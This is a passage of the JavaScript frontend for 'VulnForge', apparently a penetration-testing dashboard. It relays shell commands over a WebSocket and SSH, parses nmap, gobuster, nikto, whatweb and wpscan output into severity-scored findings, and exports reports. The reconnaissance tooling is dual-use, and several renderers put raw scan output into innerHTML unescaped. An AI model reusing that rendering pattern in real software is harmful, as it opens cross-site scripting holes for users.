/**
 * ============================================================
 *  VulnForge — Frontend Controller
 *  WebSocket · SSH · Arsenal · Reports · Script Builder
 * ============================================================
 */

let ws;

document.addEventListener('DOMContentLoaded', () => {

    // ============================================================
    //  DATA SERVICE — check DB status
    // ============================================================
    const dbDot = document.getElementById('db-status-dot');
    const dbText = document.getElementById('db-status-text');
    function updateDbStatus(available) {
        if (!dbDot || !dbText) return;
        if (available) {
            dbDot.className = 'inline-block w-1.5 h-1.5 rounded-full bg-neon';
            dbText.textContent = 'DB: Supabase ✓';
            dbText.className = 'tracking-wider text-neon/70';
        } else {
            dbDot.className = 'inline-block w-1.5 h-1.5 rounded-full bg-gray-800';
            dbText.textContent = 'DB: localStorage';
            dbText.className = 'tracking-wider text-gray-800';
        }
    }
    // Poll DataService until ready
    const _dbCheck = setInterval(() => {
        if (DataService._ready) {
            updateDbStatus(DataService.available);
            clearInterval(_dbCheck);
        }
    }, 100);
    // Timeout after 5s
    setTimeout(() => { clearInterval(_dbCheck); }, 5000);

    // ============================================================
    //  REFERENCIAS DOM
    // ============================================================
    const output          = document.getElementById('terminal-output');
    const statusInd       = document.getElementById('status-indicator');
    const statusText      = document.getElementById('status-text');
    const connBadge       = document.getElementById('conn-badge');
    const connTitle       = document.getElementById('terminal-title');
    const cmdInput        = document.getElementById('cmd-input');
    const btnConnect      = document.getElementById('btn-connect');
    const btnDisconnect   = document.getElementById('btn-disconnect');
    const btnSend         = document.getElementById('btn-send');
    const targetInput     = document.getElementById('target-ip');
    const connSelector    = document.getElementById('conn-selector');
    const activeConn      = document.getElementById('active-conn-display');
    const connDot         = document.getElementById('conn-dot');
    const connLabel       = document.getElementById('conn-label');
    const scriptEditor    = document.getElementById('script-editor');
    const scriptName      = document.getElementById('script-name');
    const deployLog       = document.getElementById('deploy-log');
    const deployLogText   = document.getElementById('deploy-log-text');

    let activeConnectionId = null;
    let connections = [];

    // ============================================================
    //  REPORTS SYSTEM
    // ============================================================
    let reports = [];
    let currentToolRunning = null;   // tool ID currently being run
    let outputBuffer = '';           // accumulated output for parsing
    let pendingTool = null;          // tool pending prompt-based parsing (survives timer expiry)
    let _toolParsed = false;         // true once finishToolOutput has run for this tool

    window.reports = reports; // expose for debugging

    function addReport(report) {
        report.id = Date.now();
        report.timestamp = new Date().toLocaleTimeString();
        reports.unshift(report); // newest first
        renderReports();

        // Persist to Supabase if available
        if (DataService && DataService.available) {
            DataService.saveReport({
                type: report.type || 'manual',
                title: `${report.type || 'scan'} — ${report.target || 'unknown'}`,
                target: report.target || '',
                raw_output: report.raw || '',
                parsed_data: report.parsed_data || report.ports || report.dirs || {},
                format: 'md'
            }).then(saved => {
                if (saved && saved.id) report.db_id = saved.id;
            }).catch(() => {});
        }
    }

    // Load reports from Supabase on startup
    async function loadReportsFromDB() {
        if (!DataService || !DataService.available) return;
        try {
            const remote = await DataService.listReports();
            if (remote && remote.length > 0) {
                // Merge: remote reports first (newest), then local
                const existingIds = new Set(reports.map(r => r.db_id));
                for (const r of remote) {
                    if (!existingIds.has(r.id)) {
                        reports.push({
                            id: Date.now() + Math.random(),
                            db_id: r.id,
                            type: r.type,
                            target: r.target,
                            raw: r.raw_output,
                            parsed_data: r.parsed_data,
                            ports: r.parsed_data?.ports,
                            dirs: r.parsed_data?.dirs,
                            timestamp: new Date(r.created_at).toLocaleTimeString()
                        });
                    }
                }
                renderReports();
            }
        } catch (e) {
            console.warn('Failed to load reports from DB:', e);
        }
    }
    // Load after a short delay (give DataService time to init)
    setTimeout(loadReportsFromDB, 1500);

    function renderReports() {
        const container = document.getElementById('reports-container');
        const count     = document.getElementById('report-count');
        if (!container) return;

        const btnExport = document.getElementById('btn-export-reports');
        if (reports.length === 0) {
            container.innerHTML = `
                <div class="report-empty">
                    <div class="icon">📂</div>
                    <div>No reports yet</div>
                    <div class="text-[10px] mt-1 text-gray-700">Run a scan from the Arsenal to see results here</div>
                </div>`;
            if (count) count.textContent = '(0)';
            if (btnExport) btnExport.disabled = true;
            return;
        }

        if (count) count.textContent = `(${reports.length})`;
        if (btnExport) btnExport.disabled = false;

        container.innerHTML = reports.map(r => {
            let bodyHtml = '';

            if (r.type === 'nmap') {
                bodyHtml = renderNmapReport(r);
            } else if (r.type === 'gobuster') {
                bodyHtml = renderGobusterReport(r);
            } else {
                bodyHtml = `<div class="text-[11px] text-gray-500 font-mono">${r.raw?.substring(0, 300) || 'No data'}</div>`;
            }

            const toolColor = r.type === 'nmap' ? 'text-violet-400' : r.type === 'gobuster' ? 'text-sky-400' : 'text-gray-400';

            return `
                <div class="report-card">
                    <div class="flex items-center justify-between mb-1.5">
                        <span class="text-[10px] font-semibold uppercase tracking-wider ${toolColor}">${r.type} › ${r.target}</span>
                        <span class="flex items-center gap-2">
                            <button onclick="exportScanReport(${reports.indexOf(r)}, 'md')"
                                class="text-[9px] text-gray-600 hover:text-neon transition-colors">⬇ .md</button>
                            <button onclick="exportScanReport(${reports.indexOf(r)}, 'html')"
                                class="text-[9px] text-gray-600 hover:text-cyber transition-colors">⬇ .html</button>
                            <button onclick="exportScanReport(${reports.indexOf(r)}, 'pdf')"
                                class="text-[9px] text-gray-600 hover:text-blood transition-colors">⬇ PDF</button>
                            <span class="text-[9px] text-gray-700">${r.timestamp}</span>
                        </span>
                    </div>
                    ${bodyHtml}
                </div>`;
        }).join('');
    }

    function renderNmapReport(r) {
        if (!r.ports || r.ports.length === 0) {
            return `<div class="text-[11px] text-gray-600">${r.raw?.substring(0, 400) || 'No open ports found'}</div>`;
        }
        let html = `<div class="text-[10px] text-gray-600 mb-1.5">Open ports: <span class="text-neon">${r.ports.length}</span></div>`;
        html += `<div class="flex flex-wrap gap-1.5">`;
        r.ports.forEach(p => {
            html += `<span class="port-badge">${p.port}/${p.protocol || 'tcp'}
                <span class="service-tag">${p.service || p.state || '?'}</span>
                ${p.version ? `<span class="text-[8px] text-gray-700 ml-1">${p.version}</span>` : ''}
            </span>`;
        });
        html += `</div>`;
        if (r.os) html += `<div class="text-[10px] text-gray-700 mt-1.5">OS: ${r.os}</div>`;
        return html;
    }

    function renderGobusterReport(r) {
        if (!r.dirs || r.dirs.length === 0) {
            return `<div class="text-[11px] text-gray-600">${r.raw?.substring(0, 400) || 'No directories found'}</div>`;
        }
        let html = `<div class="text-[10px] text-gray-600 mb-1.5">Found: <span class="text-neon">${r.dirs.length}</span> directories</div>`;
        html += `<div class="space-y-0.5">`;
        r.dirs.forEach(d => {
            const color = d.status < 300 ? 'text-neon' : d.status < 400 ? 'text-yellow-400' : 'text-gray-600';
            html += `<div class="text-[11px] font-mono">
                <span class="${color}">[${d.status}]</span>
                <span class="text-gray-400">${d.path}</span>
                ${d.size ? `<span class="text-gray-700 text-[9px]">(${d.size})</span>` : ''}
            </div>`;
        });
        html += `</div>`;
        return html;
    }

    function clearReports() {
        reports = [];
        renderReports();
        showToast('Reports cleared');
    }
    window.clearReports = clearReports;

    // ── Parse Nmap output ──
    function parseNmapOutput(text, target) {
        const report = { type: 'nmap', target, ports: [], os: '', raw: text };

        // Extract open ports
        const portRegex = /(\d+)\/(tcp|udp)\s+open\s+(\S+)(?:\s+(.+))?/gi;
        let match;
        while ((match = portRegex.exec(text)) !== null) {
            report.ports.push({
                port: match[1],
                protocol: match[2],
                state: 'open',
                service: match[3] || '?',
                version: (match[4] || '').trim()
            });
        }

        // Extract OS
        const osMatch = text.match(/OS details:\s*(.+)/i);
        if (osMatch) report.os = osMatch[1].trim();
        else {
            const osMatch2 = text.match(/Aggressive OS guesses:\s*(.+)/i);
            if (osMatch2) report.os = osMatch2[1].split(',')[0].trim();
        }

        if (report.ports.length > 0 || report.os) {
            addReport(report);
            showToast(`📊 Nmap report: ${report.ports.length} ports`);
        }
        return report;
    }

    // ── Parse Gobuster output ──
    function parseGobusterOutput(text, target) {
        const report = { type: 'gobuster', target, dirs: [], raw: text };

        const dirRegex = /(?:^|\n)\/(\S+)\s+\(Status:\s*(\d+)\)/g;
        let match;
        while ((match = dirRegex.exec(text)) !== null) {
            report.dirs.push({ path: '/' + match[1], status: parseInt(match[2]) });
        }

        // Alternative: "Found: /path (Status: 200) [Size: 123]"
        const dirRegex2 = /Found:\s+(\/\S+)\s+\(Status:\s*(\d+)\)/g;
        while ((match = dirRegex2.exec(text)) !== null) {
            // Avoid duplicates
            if (!report.dirs.some(d => d.path === match[1])) {
                report.dirs.push({ path: match[1], status: parseInt(match[2]) });
            }
        }

        if (report.dirs.length > 0) {
            addReport(report);
            showToast(`📊 Gobuster report: ${report.dirs.length} dirs`);
        }
        return report;
    }

    // ============================================================
    //  FINDINGS SYSTEM (T3MP3ST-style)
    // ============================================================
    const findings = [];

    // Severity helpers
    function severityColor(sev) {
        const map = { critical: '#f87171', high: '#fb923c', medium: '#facc15', low: '#60a5fa', info: '#94a3b8' };
        return map[sev] || '#666';
    }
    function severityBg(sev) {
        const map = { critical: '#1a0a0a', high: '#1a0f0a', medium: '#1a180a', low: '#0a0f1a', info: '#0a0a0a' };
        return map[sev] || '#0a0a0a';
    }
    function severityBadge(sev) {
        const map = { critical: 'CRITICAL', high: 'HIGH', medium: 'MEDIUM', low: 'LOW', info: 'INFO' };
        return map[sev] || 'UNKNOWN';
    }

    // Assign severity based on finding type and data
    function assignSeverity(finding) {
        // Port-based
        if (finding.port === '22') return 'low';
        if (finding.port === '80' || finding.port === '443') return 'info';
        if (['21', '23', '3389', '5900', '5901'].includes(finding.port)) return 'medium';
        if (finding.port === '445' || finding.port === '139') return 'high';

        // Service-based
        if (finding.service && /mysql|postgresql|redis|elastic|mongodb/i.test(finding.service)) return 'high';
        if (finding.service && /apache|nginx|iis|http/i.test(finding.service) && !finding.version) return 'low';
        if (finding.service && /apache|nginx|iis|http/i.test(finding.service) && finding.version) return 'medium';

        // Directory-based
        if (finding.status === 200 || finding.status === 201 || finding.status === 204) return 'medium';
        if (finding.status === 301 || finding.status === 302 || finding.status === 307) return 'low';
        if (finding.status === 401 || finding.status === 403) return 'info';
        if (finding.status === 500) return 'critical';

        // Vulnerability-based
        if (finding.type === 'vuln') return 'critical';
        if (finding.type === 'tech') return 'info';

        return 'info';
    }

    // ── Parsers ──

    function parseNmapFindings(text, target) {
        const items = [];
        const portRegex = /(\d+)\/(tcp|udp)\s+open\s+(\S+)(?:\s+(.+))?/gi;
        let match;
        while ((match = portRegex.exec(text)) !== null) {
            const finding = {
                tool: 'nmap',
                target,
                type: 'port',
                port: match[1],
                protocol: match[2],
                service: match[3] || '?',
                version: (match[4] || '').trim(),
                raw: match[0]
            };
            finding.severity = assignSeverity(finding);
            items.push(finding);
        }

        // OS detection as finding
        const osMatch = text.match(/OS details:\s*(.+)/i);
        if (osMatch) {
            items.push({
                tool: 'nmap',
                target,
                type: 'os',
                severity: 'info',
                title: 'OS Detected',
                detail: osMatch[1].trim()
            });
        }

        return items;
    }

    function parseGobusterFindings(text, target) {
        const items = [];
        const dirRegex = /(?:^|\n)\/(\S+)\s+\(Status:\s*(\d+)\)/g;
        let match;
        while ((match = dirRegex.exec(text)) !== null) {
            const finding = {
                tool: 'gobuster',
                target,
                type: 'directory',
                path: '/' + match[1],
                status: parseInt(match[2]),
                severity: assignSeverity({ status: parseInt(match[2]) })
            };
            items.push(finding);
        }

        // Also match "Found: /path (Status: 200)" format
        const dirRegex2 = /Found:\s+(\/\S+)\s+\(Status:\s*(\d+)\)/g;
        while ((match = dirRegex2.exec(text)) !== null) {
            if (!items.some(d => d.path === match[1])) {
                items.push({
                    tool: 'gobuster',
                    target,
                    type: 'directory',
                    path: match[1],
                    status: parseInt(match[2]),
                    severity: assignSeverity({ status: parseInt(match[2]) })
                });
            }
        }

        return items;
    }

    function parseNiktoFindings(text, target) {
        const items = [];
        // Nikto: + /path: description
        const vulnRegex = /^\+\s+(\/\S+)?\s*:\s*(.+)$/gm;
        let match;
        while ((match = vulnRegex.exec(text)) !== null) {
            const desc = match[2].trim();
            const finding = {
                tool: 'nikto',
                target,
                type: 'vuln',
                path: match[1] || '/',
                title: desc.substring(0, 80),
                detail: desc,
                severity: assignSeverity({ type: 'vuln' })
            };
            // Adjust severity based on keywords
            if (/allows|bypass|exec|overflow|remote|critical|high/i.test(desc)) finding.severity = 'critical';
            else if (/xss|sqli|path|disclosure|injection/i.test(desc)) finding.severity = 'high';
            else if (/info|version|fingerprint/i.test(desc)) finding.severity = 'info';
            items.push(finding);
        }
        return items;
    }

    function parseWhatwebFindings(text, target) {
        const items = [];
        const seen = new Set(); // dedup by normalized key:val
        // whatweb output format: URL [HTTP_CODE] Key[value], Key2[value2]...
        // Approach: find lines containing URLs, then extract all Key[value] pairs
        const urlLineRegex = /^(https?:\/\/\S+)\s+(.+)$/gm;
        let urlMatch;
        while ((urlMatch = urlLineRegex.exec(text)) !== null) {
            const url = urlMatch[1];
            const rest = urlMatch[2];
            // Extract all [value] or Key[value] patterns from the rest
            const bracketRegex = /(\w[\w-]*)?\[([^\]]+)\]/g;
            let bm;
            while ((bm = bracketRegex.exec(rest)) !== null) {
                const key = bm[1] || '';  // optional key before brackets
                const rawValue = bm[2];    // content inside brackets
                // Split comma-separated values inside single bracket group
                // e.g. "arc-geo,astz,hpage" -> three separate items
                const values = rawValue.split(',').map(v => v.trim()).filter(v => v.length > 0);
                for (const val of values) {
                    // Skip numeric IPs, short codes, numeric status codes
                    if (/^\d+$/.test(val) && val.length < 5) continue;
                    if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(val)) continue;
                    if (/^\w{2,3}$/.test(val) && val === val.toUpperCase()) continue; // country codes
        
                    // Dedup: same (key, val) across multiple URLs
                    const dedupKey = key + ':' + val;
                    if (seen.has(dedupKey)) continue;
                    seen.add(dedupKey);
        
                    const finding = {
                        tool: 'whatweb',
                        target,
                        type: 'tech',
                        title: key ? `${key} → ${val}` : val,
                        detail: `${key ? key + ': ' : ''}${val}`,
                        severity: 'info'
                    };
                    // Flag known vuln versions
                    if (/Apache 2\.4\.49/i.test(val) || /Apache 2\.4\.50/i.test(val)) finding.severity = 'critical';
                    else if (/PHP\s*5/i.test(val) || /IIS\s*6/i.test(val)) finding.severity = 'high';
                    else if (/nginx\s*1\.\d+\.\d+/i.test(val)) finding.severity = 'medium';
                    items.push(finding);
                }
            }
        }
        return items;
    }

    function parseFfufFindings(text, target) {
        const items = [];
        // ffuf: /path [Status: 200, Size: 123]
        const ffufRegex = /(\/\S+)\s+\[Status:\s*(\d+)/g;
        let match;
        while ((match = ffufRegex.exec(text)) !== null) {
            const finding = {
                tool: 'ffuf',
                target,
                type: 'directory',
                path: match[1],
                status: parseInt(match[2]),
                severity: assignSeverity({ status: parseInt(match[2]) })
            };
            items.push(finding);
        }
        return items;
    }

    function parseWpscanFindings(text, target) {
        const items = [];
        // WordPress user enumeration
        const userRegex = /\[\+\]\s*(\S+)\s*$/gm;
        let match;
        while ((match = userRegex.exec(text)) !== null) {
            items.push({
                tool: 'wpscan',
                target,
                type: 'user',
                title: 'WordPress User: ' + match[1],
                detail: 'User found: ' + match[1],
                severity: 'medium'
            });
        }
        // Plugin detection
        const pluginRegex = /\[\+\]\s*.*plugin.*:\s*(\S+)/gi;
        while ((match = pluginRegex.exec(text)) !== null) {
            items.push({
                tool: 'wpscan',
                target,
                type: 'plugin',
                title: 'WP Plugin: ' + match[1],
                detail: 'Plugin detected: ' + match[1],
                severity: 'info'
            });
        }
        return items;
    }

    // ── Main parse dispatcher ──
    function parseToolOutput(tool, text, target) {
        let items = [];
        switch (tool) {
            case 'nmap':      items = parseNmapFindings(text, target); break;
            case 'gobuster':  items = parseGobusterFindings(text, target); break;
            case 'dirb':      items = parseGobusterFindings(text, target); break;
            case 'ffuf':      items = parseFfufFindings(text, target); break;
            case 'nikto':     items = parseNiktoFindings(text, target); break;
            case 'whatweb':   items = parseWhatwebFindings(text, target); break;
            case 'wpscan':    items = parseWpscanFindings(text, target); break;
        }
        return items;
    }

    // ── Build a Set of existing finding keys for fast dedup ──
    function _existingKeys() {
        const s = new Set();
        for (const f of findings) s.add(_findingKey(f));
        return s;
    }

    // ── Add findings (with dedup) ──
    function addFindings(items) {
        if (!items || items.length === 0) return;
        const existing = _existingKeys();
        let added = 0;
        for (const item of items) {
            const key = _findingKey(item);
            if (!existing.has(key)) {
                existing.add(key);
                // Give it a deterministic hash from the key for stable identity
                item.id = _hashStr(key);
                findings.unshift(item);
                added++;
            }
        }
        if (added === 0) {
            showToast(`⏭ ${items[0].tool} — 0 new findings (all duplicates)`);
            return;
        }
        renderFindings();
        updateFindingsCount();
        const byTool = items[0].tool || 'scan';
        showToast(`🎯 +${added} ${byTool} finding${added > 1 ? 's' : ''}`);
    }

    // ── Simple string hash for stable finding IDs ──
    function _hashStr(str) {
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            const chr = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + chr;
            hash |= 0; // Convert to 32bit int
        }
        return Math.abs(hash);
    }

    // ── Render findings cards ──
    function renderFindings(filterSeverity) {
        const container = document.getElementById('findings-list');
        const empty = document.getElementById('findings-empty');
        if (!container) return;

        let list = findings;
        if (filterSeverity && filterSeverity !== 'all') {
            list = findings.filter(f => f.severity === filterSeverity);
        }

        if (list.length === 0) {
            container.innerHTML = '<div class="text-center text-[11px] text-gray-700 py-8">No findings match this filter.</div>';
            return;
        }

        container.innerHTML = list.map(f => {
            const sev = f.severity || 'info';
            const color = severityColor(sev);
            const bg = severityBg(sev);
            const badge = severityBadge(sev);
            const icon = f.tool === 'nmap' ? '🔍' : f.tool === 'gobuster' || f.tool === 'dirb' ? '📁' :
                         f.tool === 'ffuf' ? '🌐' : f.tool === 'nikto' ? '⚠️' :
                         f.tool === 'whatweb' ? '🔎' : f.tool === 'wpscan' ? '📌' : '🎯';

            let title = f.title || '';
            let subtitle = '';

            if (f.type === 'port') {
                title = `${f.port}/${f.protocol} — ${f.service}`;
                subtitle = f.version || 'no version';
            } else if (f.type === 'directory') {
                title = f.path;
                subtitle = `Status: ${f.status}` + (f.status >= 400 ? ' ⚠️' : '');
            } else if (f.type === 'vuln') {
                title = f.title || 'Potential vulnerability';
                subtitle = f.detail ? f.detail.substring(0, 120) : '';
            } else if (f.type === 'tech') {
                title = f.title;
                // Extract key name before arrow or colon for cleaner subtitle
                const arrowIdx = f.title.indexOf('→');
                const colonIdx = f.title.indexOf(':');
                const splitIdx = arrowIdx > 0 ? arrowIdx : (colonIdx > 0 ? colonIdx : -1);
                if (splitIdx > 0 && splitIdx < 80) {
                    subtitle = f.title.substring(0, splitIdx).trim();
                } else {
                    subtitle = 'Technology detected';
                }
            } else if (f.type === 'os') {
                title = f.detail || 'Unknown OS';
                subtitle = 'OS Detection';
            } else if (f.type === 'user' || f.type === 'plugin') {
                subtitle = f.type === 'user' ? 'User enumeration' : 'Plugin detected';
            } else if (f.detail) {
                // Fallback for any type with detail (generic findings)
                subtitle = f.detail.substring(0, 150);
            }

            const isInfo = sev === 'info';
            return `
                <div class="finding-card rounded-lg border transition-all hover:brightness-110 ${isInfo ? 'p-1.5' : 'p-2.5'}" 
                     style="border-color:${color}33; background:${bg};"
                     data-severity="${sev}">
                    <div class="flex items-start gap-1.5">
                        <span class="${isInfo ? 'text-[11px]' : 'text-[14px]'} mt-0.5 flex-shrink-0">${icon}</span>
                        <div class="flex-1 min-w-0">
                            <div class="flex items-center gap-1.5">
                                <span class="${isInfo ? 'text-[10px]' : 'text-[11px]'} font-semibold truncate" style="color:${color}">${title}</span>
                                <span class="text-[7px] px-1 py-0.5 rounded font-bold tracking-wider flex-shrink-0" 
                                      style="background:${color}22; color:${color}">${badge}</span>
                            </div>
                            ${subtitle ? `<div class="${isInfo ? 'text-[9px]' : 'text-[10px]'} text-gray-600 mt-0.5 truncate">${subtitle}</div>` : ''}
                            <div class="flex items-center gap-1.5 mt-0.5 ${isInfo ? 'text-[7px]' : 'text-[8px]'} text-gray-700">
                                <span>${f.tool}</span>
                                <span>·</span>
                                <span class="truncate max-w-[120px]">${f.target}</span>
                            </div>
                        </div>
                    </div>
                </div>
            `;
        }).join('');
    }

    function updateFindingsCount() {
        const el = document.getElementById('findings-count');
        if (el) el.textContent = `(${findings.length})`;
    }

    // ── Clear findings ──
    window.clearFindings = function () {
        findings.length = 0;
        renderFindings();
        updateFindingsCount();
        showToast('🗑️ Findings cleared');
    };

    // ── Export findings ──
    window.exportFindings = function () {
        if (findings.length === 0) {
            showToast('No findings to export');
            return;
        }
        const format = (document.getElementById('findings-format') || { value: 'txt' }).value;
        const date = new Date().toISOString().split('T')[0];
        const safeName = `findings-${date}`;

        let content;
        switch (format) {
            case 'md': {
                content = `# Findings Report\n\n`;
                content += `**Date:** ${new Date().toISOString()}\n`;
                content += `**Total findings:** ${findings.length}\n\n`;
                content += `| Severity | Tool | Target | Finding |\n`;
                content += `|----------|------|--------|--------|\n`;
                for (const f of findings) {
                    const sev = severityBadge(f.severity);
                    const title = f.title || f.path || `${f.port}/${f.protocol} ${f.service}` || f.detail || '';
                    content += `| ${sev} | ${f.tool} | ${f.target} | ${title} |\n`;
                }
                downloadString(content, `${safeName}.md`, 'text/markdown');
                showToast('⬇ MD exported');
                break;
            }
            case 'txt': {
                content = `═══════════════════════════════════════════\n`;
                content += `  FINDINGS REPORT\n`;
                content += `  Date: ${new Date().toISOString()}\n`;
                content += `  Total: ${findings.length}\n`;
                content += `═══════════════════════════════════════════\n\n`;
                for (const f of findings) {
                    const sev = f.severity.toUpperCase().padEnd(8);
                    const tool = (f.tool || '?').padEnd(10);
                    const title = f.title || f.path || `${f.port}/${f.protocol} ${f.service}` || f.detail || '';
                    content += `[${sev}] [${tool}] ${f.target}  ${title}\n`;
                }
                content += `\n──  End of report  ──\n`;
                downloadString(content, `${safeName}.txt`, 'text/plain');
                showToast('⬇ TXT exported');
                break;
            }
            case 'html':
            case 'pdf': {
                let htmlContent = `# Findings Report\n\n`;
                htmlContent += `**Date:** ${new Date().toISOString()}\n`;
                htmlContent += `**Total findings:** ${findings.length}\n\n`;
                htmlContent += `| Severity | Tool | Target | Finding |\n`;
                htmlContent += `|----------|------|--------|--------|\n`;
                for (const f of findings) {
                    const sev = severityBadge(f.severity);
                    const title = f.title || f.path || `${f.port}/${f.protocol} ${f.service}` || f.detail || '';
                    htmlContent += `| ${sev} | ${f.tool} | ${f.target} | ${title} |\n`;
                }
                if (format === 'html') {
                    const html = buildExportHTML(htmlContent, 'Findings Report', 'findings');
                    downloadString(html, `${safeName}.html`, 'text/html');
                    showToast('⬇ HTML exported');
                } else {
                    const html = buildExportHTML(htmlContent, 'Findings Report', 'findings');
                    openPDFPreview(html, `Findings Report — ${date}`);
                }
                break;
            }
        }
    };

    // ── Findings filter click handler ──
    document.addEventListener('click', (e) => {
        const btn = e.target.closest('.finding-filter');
        if (!btn) return;
        document.querySelectorAll('.finding-filter').forEach(b => {
            b.style.background = 'transparent';
            b.style.color = '#888';
        });
        btn.style.background = '#ffffff0a';
        btn.style.color = '#fff';
        renderFindings(btn.dataset.severity);
    });

    // ============================================================
    //  SALIDA EN TERMINAL
    // ============================================================
    // Strip ANSI escape codes (colours, cursor moves, title sequences)
    function stripANSI(s) {
        return s
            .replace(/\x1b\[[\d;?]*[a-zA-Z]/g, '')   // CSI (colours, cursor, DEC private)
            .replace(/\x1b\][^\x07]*\x07/g, '')       // OSC (window title)
            .replace(/\x1b./g, '')                    // any remaining ESC + 1 char (ESC =, >, (, ), etc.)
            .replace(/[\uE000-\uF8FF\u200B-\u200F\u2028-\u202F]/g, ''); // Nerd Font icons (PUA) + zero-width chars
    }

    // ── Command history (client-side) ──
    const cmdHistory = [];
    let cmdHistoryIdx = -1;
    const CMD_HISTORY_MAX = 100;

    window.sendCommand = function () {
        if (!ensureConnected()) return;
        const cmd = cmdInput.value.trim();
        if (!cmd) return;
        ws.send(cmd);
        // Store in history (avoid dupes)
        if (cmdHistory.length === 0 || cmdHistory[cmdHistory.length - 1] !== cmd) {
            cmdHistory.push(cmd);
            if (cmdHistory.length > CMD_HISTORY_MAX) cmdHistory.shift();
        }
        cmdHistoryIdx = cmdHistory.length; // reset index to end
        cmdInput.value = '';
    };

    window.stopCommand = function () {
        if (!ensureConnected()) return;
        ws.send(JSON.stringify({ type: 'interrupt' }));
        appendOutput('\n⏹ Sending interrupt (Ctrl+C)...\n');
        showToast('⏹ Interrupt sent');
    };

    // Arrow up/down → navigate history
    cmdInput.addEventListener('keydown', (event) => {
        if (event.key === 'ArrowUp') {
            event.preventDefault();
            if (cmdHistoryIdx > 0) {
                cmdHistoryIdx--;
                cmdInput.value = cmdHistory[cmdHistoryIdx];
                // Force focus + cursor to end (fixes visual glitch when terminal updates)
                cmdInput.focus();
                cmdInput.setSelectionRange(cmdInput.value.length, cmdInput.value.length);
            }
        } else if (event.key === 'ArrowDown') {
            event.preventDefault();
            if (cmdHistoryIdx < cmdHistory.length - 1) {
                cmdHistoryIdx++;
                cmdInput.value = cmdHistory[cmdHistoryIdx];
                cmdInput.focus();
                cmdInput.setSelectionRange(cmdInput.value.length, cmdInput.value.length);
            } else {
                cmdHistoryIdx = cmdHistory.length;
                cmdInput.value = '';
                cmdInput.focus();
            }
        } else if (event.key === 'Tab') {
            event.preventDefault();
            requestTabCompletion();
        }
    });

    // ── Tab Completion System (via backend exec_command — no shell echo) ──
    let _compTimer = null;

    function getCurrentWord() {
        const text = cmdInput.value;
        const cursor = cmdInput.selectionStart || text.length;
        let start = cursor;
        while (start > 0 && text[start - 1] !== ' ') start--;
        return { word: text.slice(start, cursor), prefix: text.slice(0, start), suffix: text.slice(cursor) };
    }

    function requestTabCompletion() {
        if (!ws || ws.readyState !== WebSocket.OPEN) return;
        const { word } = getCurrentWord();
        if (!word) return;

        const textBefore = cmdInput.value.slice(0, cmdInput.selectionStart || cmdInput.value.length);
        const words = textBefore.trim().split(/\s+/);
        const isFirstWord = words.length === 1 && !textBefore.includes(' ');

        // Send JSON to backend — runs compgen via exec_command (no shell echo)
        ws.send(JSON.stringify({
            type: "tab_complete",
            text: word,
            is_command: isFirstWord
        }));

        // Safety timeout: clear dropdown state after 5s
        if (_compTimer) clearTimeout(_compTimer);
        _compTimer = setTimeout(() => {
            const dd = document.getElementById('tab-completions');
            if (dd) dd.classList.add('hidden');
        }, 5000);
    }

    function showCompletionDropdown(items) {
        const dropdown = document.getElementById('tab-completions');
        if (!dropdown) return;

        const unique = [...new Set(items)].sort();
        dropdown.innerHTML = '';

        if (unique.length === 0) {
            dropdown.classList.add('hidden');
            return;
        }

        if (unique.length === 1) {
            applyCompletion(unique[0]);
            dropdown.classList.add('hidden');
            showToast(`⭾ ${unique[0]}`);
            return;
        }

        const maxShow = 12;
        const show = unique.slice(0, maxShow);
        for (const item of show) {
            const div = document.createElement('div');
            div.className = 'px-3 py-1.5 text-[13px] text-gray-200 hover:text-white hover:bg-neon/15 cursor-pointer transition-all font-mono border-b border-gray-800 last:border-0';
            div.textContent = item;
            div.addEventListener('click', () => {
                applyCompletion(item);
                dropdown.classList.add('hidden');
                cmdInput.focus();
            });
            dropdown.appendChild(div);
        }
        if (unique.length > maxShow) {
            const more = document.createElement('div');
            more.className = 'px-3 py-1 text-[9px] text-gray-700 text-center';
            more.textContent = `⋯ ${unique.length - maxShow} more`;
            dropdown.appendChild(more);
        }

        // ── Smart positioning: measure available space above the input ──
        const inputRect = cmdInput.getBoundingClientRect();
        const spaceAbove = inputRect.top;
        const spaceBelow = window.innerHeight - inputRect.bottom;
        const itemHeight = 32; // ~32px per item including padding+border
        const estimatedHeight = Math.min(show.length * itemHeight + 30, 180);

        // Remove both positioning classes, then add the appropriate one
        dropdown.classList.remove('above', 'below');

        if (spaceAbove >= estimatedHeight || spaceAbove >= spaceBelow) {
            // Show ABOVE the input (default)
            dropdown.style.maxHeight = Math.min(spaceAbove - 24, 180) + 'px';
            dropdown.style.bottom = '100%';
            dropdown.style.top = 'auto';
            dropdown.style.marginBottom = '6px';
            dropdown.style.marginTop = '0';
        } else {
            // Show BELOW the input (more room there)
            dropdown.style.maxHeight = Math.min(spaceBelow - 24, 180) + 'px';
            dropdown.style.top = '100%';
            dropdown.style.bottom = 'auto';
            dropdown.style.marginTop = '6px';
            dropdown.style.marginBottom = '0';
        }

        dropdown.classList.remove('hidden');

        // Keyboard navigation
        window._tabItems = unique;
        window._tabIndex = -1;
    }

    function applyCompletion(item) {
        const { word } = getCurrentWord();
        const cursor = cmdInput.selectionStart || cmdInput.value.length;
        const before = cmdInput.value.slice(0, cursor - word.length);
        const after = cmdInput.value.slice(cursor);
        // If item looks like a directory (or is below /), append / for further completion
        let completed = item;
        if (completed.includes(' ')) completed = completed.replace(/ /g, '\\ ');
        cmdInput.value = before + completed + after;
        const newPos = before.length + completed.length;
        cmdInput.setSelectionRange(newPos, newPos);
        cmdInput.focus();
    }

    // Close dropdown when clicking outside
    document.addEventListener('click', (e) => {
        const dd = document.getElementById('tab-completions');
        const inp = document.getElementById('cmd-input');
        if (dd && !dd.contains(e.target) && e.target !== inp) {
            dd.classList.add('hidden');
        }
    });

    // Keyboard nav for open dropdown
    document.addEventListener('keydown', (e) => {
        const dd = document.getElementById('tab-completions');
        if (!dd || dd.classList.contains('hidden')) return;

        if (e.key === 'Escape') {
            dd.classList.add('hidden');
            e.preventDefault();
            return;
        }
        if (e.key === 'Enter' && window._tabIndex >= 0 && window._tabItems) {
            e.preventDefault();
            applyCompletion(window._tabItems[window._tabIndex]);
            dd.classList.add('hidden');
            return;
        }
        if (e.key === 'Tab') {
            e.preventDefault();
            const items = window._tabItems;
            if (items && items.length > 0) {
                const idx = window._tabIndex >= 0 ? window._tabIndex : 0;
                applyCompletion(items[idx]);
                dd.classList.add('hidden');
            }
            return;
        }
